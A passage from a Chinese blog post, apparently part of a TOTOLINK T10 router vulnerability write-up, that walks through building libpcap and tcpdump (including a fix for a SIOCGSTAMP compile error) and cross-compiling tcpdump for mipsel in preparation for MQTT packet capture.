&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514094607650.png&#34; alt=&#34;image-20230514094607650&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;五、mqtt分析&#34;&gt;&lt;a href=&#34;#五、mqtt分析&#34; class=&#34;headerlink&#34; title=&#34;五、mqtt分析&#34;&gt;&lt;/a&gt;五、mqtt分析&lt;/h1&gt;&lt;h2 id=&#34;5-1-抓包分析-以telnet为例&#34;&gt;&lt;a href=&#34;#5-1-抓包分析-以telnet为例&#34; class=&#34;headerlink&#34; title=&#34;5.1 抓包分析:(以telnet为例)&#34;&gt;&lt;/a&gt;5.1 抓包分析:(以telnet为例)&lt;/h2&gt;&lt;h3 id=&#34;5-1-1-安装libpcap-x2F-tcpdump&#34;&gt;&lt;a href=&#34;#5-1-1-安装libpcap-x2F-tcpdump&#34; class=&#34;headerlink&#34; title=&#34;5.1.1 安装libpcap&amp;#x2F;tcpdump&#34;&gt;&lt;/a&gt;5.1.1 安装libpcap&amp;#x2F;tcpdump&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;官网下载tcpdump和libpcap&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;git clone https://github.com/the-tcpdump-group/tcpdump&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git clone https://github.com/the-tcpdump-group/libpcap&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;Git clone的版本比较新,有所不同,可以用这个&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.tcpdump.org/old_releases.html&#34;&gt;https://www.tcpdump.org/old_releases.html&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;5-1-1-1-libpcap&#34;&gt;&lt;a href=&#34;#5-1-1-1-libpcap&#34; class=&#34;headerlink&#34; title=&#34;5.1.1.1 libpcap&#34;&gt;&lt;/a&gt;5.1.1.1 libpcap&lt;/h4&gt;&lt;p&gt;先安装两个依赖&lt;/p&gt;
&lt;p&gt;先安装flex&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#libpcap 1.1要求flex必须在2.4.6及以上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget http:&lt;span class=&#34;comment&#34;&gt;//prdownloads.sourceforge.net/flex/flex-2.5.36.tar.gz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -xzvf flex&lt;span class=&#34;number&#34;&gt;-2.5&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.36&lt;/span&gt;.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd flex&lt;span class=&#34;number&#34;&gt;-2.5&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.36&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./configure --prefix=/usr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make -j &amp;amp;&amp;amp; make install&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;安装bison&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget http:&lt;span class=&#34;comment&#34;&gt;//ftp.gnu.org/gnu/bison/bison-2.4.tar.gz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -xzvf bison&lt;span class=&#34;number&#34;&gt;-2.4&lt;/span&gt;.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd bison&lt;span class=&#34;number&#34;&gt;-2.4&lt;/span&gt;/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./configure --prefix=/usr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make -j &amp;amp;&amp;amp; make install&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;安装libpcap&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget http:&lt;span class=&#34;comment&#34;&gt;//www.tcpdump.org/release/libpcap-1.1.1.tar.gz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -xzvf libpcap&lt;span class=&#34;number&#34;&gt;-1.1&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd libpcap&lt;span class=&#34;number&#34;&gt;-1.1&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./configure --prefix=/usr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make -j &amp;amp;&amp;amp; make install&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;–prefix&amp;#x3D;&amp;#x2F;usr指定软件安装路径&lt;/p&gt;
&lt;p&gt;报错处理&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@vultr:~/net/libpcap&lt;span class=&#34;number&#34;&gt;-1.1&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;meta&#34;&gt;# make -j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc -O2 -fpic -I.  -DHAVE_CONFIG_H  -D_U_=&lt;span class=&#34;string&#34;&gt;&amp;quot;__attribute__((unused))&amp;quot;&lt;/span&gt; -c scanner.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc -O2 -fpic -I.  -DHAVE_CONFIG_H  -D_U_=&lt;span class=&#34;string&#34;&gt;&amp;quot;__attribute__((unused))&amp;quot;&lt;/span&gt; -c ./pcap-linux.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc -O2 -fpic -I.  -DHAVE_CONFIG_H  -D_U_=&lt;span class=&#34;string&#34;&gt;&amp;quot;__attribute__((unused))&amp;quot;&lt;/span&gt; -Dyylval=pcap_lval -c grammar.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./pcap-linux.c: In function ‘pcap_read_packet’:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./pcap-linux.c:&lt;span class=&#34;number&#34;&gt;1555&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;: error: ‘SIOCGSTAMP’ undeclared (first use in this function); did you mean ‘SIOCGIWAP’?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;1555&lt;/span&gt; |  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (ioctl(handle-&amp;gt;fd, SIOCGSTAMP, &amp;amp;pcap_header.ts) == &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      |                        ^~~~~~~~~~&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      |                        SIOCGIWAP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./pcap-linux.c:&lt;span class=&#34;number&#34;&gt;1555&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;: note: each undeclared identifier is reported only once &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; each function it appears in&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make: *** [Makefile:&lt;span class=&#34;number&#34;&gt;81&lt;/span&gt;: pcap-linux.o] Error &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make: *** Waiting &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; unfinished jobs....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/liangjian990709/article/details/111494494&#34;&gt;https://blog.csdn.net/liangjian990709/article/details/111494494&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/LibtraceTeam/libtrace/issues/117&#34;&gt;https://github.com/LibtraceTeam/libtrace/issues/117&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;报错是说找不到这个宏的定义,找到出问题的文件pcap-linux.c,加上头文件即可 &lt;strong&gt;#include &amp;lt;linux&amp;#x2F;sockios.h&amp;gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;验证是否成功&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;pcap.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; errbuf[PCAP_ERRBUF_SIZE];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;pcap_if_t&lt;/span&gt;* devs;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;pcap_if_t&lt;/span&gt;* d;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//获取全部的dev&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt; == pcap_findalldevs(&amp;amp;devs, errbuf)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Could not list device: %s\n&amp;quot;&lt;/span&gt;, errbuf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;d = devs;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (d-&amp;gt;next != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d:%s\n&amp;quot;&lt;/span&gt;, i++, d-&amp;gt;name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;d = d-&amp;gt;next;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//释放所有获取的dev&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pcap_freealldevs(devs);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;gcc test.c -lpcap -L&amp;#x2F;usr&amp;#x2F;lib&amp;#x2F;libpcap.so&lt;/p&gt;
&lt;p&gt;-lpcap然后指定安装路径&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@vultr:~/net# ./a.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:docker0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:tun0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:enp1s0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;:virbr2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:tap2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;:br-bb76d9e6caa6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;:any&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&#34;https://www.coder4.com/archives/1001&#34;&gt;https://www.coder4.com/archives/1001&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;5-1-1-2-tcpdump&#34;&gt;&lt;a href=&#34;#5-1-1-2-tcpdump&#34; class=&#34;headerlink&#34; title=&#34;5.1.1.2 tcpdump&#34;&gt;&lt;/a&gt;5.1.1.2 tcpdump&lt;/h4&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget https:&lt;span class=&#34;comment&#34;&gt;//www.tcpdump.org/release/tcpdump-4.1.1.tar.gz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar zxvf tcpdump&lt;span class=&#34;number&#34;&gt;-4.1&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd tcpdump&lt;span class=&#34;number&#34;&gt;-4.1&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./configure --prefix=/usr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make -j &amp;amp;&amp;amp; make install&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;安装完直接命令输入 tcpdump进行测试&lt;/p&gt;
&lt;h4 id=&#34;5-1-1-3-交叉编译mipsel版tcpdump&#34;&gt;&lt;a href=&#34;#5-1-1-3-交叉编译mipsel版tcpdump&#34; class=&#34;headerlink&#34; title=&#34;5.1.1.3 交叉编译mipsel版tcpdump&#34;&gt;&lt;/a&gt;5.1.1.3 交叉编译mipsel版tcpdump&lt;/h4&gt;&lt;p&gt;安装mipsel gcc&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;apt install gcc-mipsel-linux-gnu&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;编译libpcap (重新解压一份源码)&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./configure --prefix=/home/test/mipsel_libpcap     #该目录根据情况更改&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/configure --host=mipsel-linux --with-pcap=linux --prefix=/home/test/mipsel_libpcap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make CC=mipsel-linux-gnu-gcc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make install CC=mipsel-linux-gnu-gcc       #编译的libpcap安装到了/home/test/mipsel_libpcap目录下&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;编译tcpdump&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;动态链接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./configure &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make CC=mipsel-linux-gnu-gcc CFLAGS=&lt;span class=&#34;string&#34;&gt;&amp;#x27;-I/home/test/mipsel_libpcap/include&amp;#x27;&lt;/span&gt; LDFLAGS=&lt;span class=&#34;string&#34;&gt;&amp;#x27;-L/home/test/mipsel_libpcap/lib/libpcap.a&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;静态链接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./configure&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make CC=mipsel-linux-gnu-gcc CFLAGS=&lt;span class=&#34;string&#34;&gt;&amp;#x27;-I/home/test/mipsel_libpcap/include -static&amp;#x27;&lt;/span&gt; LDFLAGS=&lt;span class=&#34;string&#34;&gt;&amp;#x27;-L/home/test/mipsel_libpcap/lib/libpcap.a -static&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;编译的时候报错,应该是版本太老了….然后….&lt;/p&gt;
&lt;p&gt;很多个版本一直报错&lt;/p&gt;
